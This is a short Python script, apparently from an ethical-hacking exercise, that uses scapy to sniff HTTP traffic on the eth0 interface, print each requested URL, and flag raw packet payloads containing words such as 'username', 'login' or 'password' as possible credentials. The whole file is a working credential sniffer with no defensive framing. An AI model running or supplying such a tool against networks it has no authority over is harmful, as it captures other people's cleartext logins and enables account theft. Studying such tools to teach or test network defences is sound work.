#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=processed_sniffed_packet)
def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ["username", "user", "login", "password", "pass", "psswd"]
        for word in keywords:
            if word in load:
                return load

def processed_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
       url=get_url(packet)
       print("[+] HTTP REQUEST >>>>>>>>>  "+url.decode())
       login_info=get_login_info(packet)
       if login_info:
           print("\n\n [+] POSSIBLE USERNAME AND PASSWORD >>>>>> \n"+login_info+"\n\n")


sniff("eth0")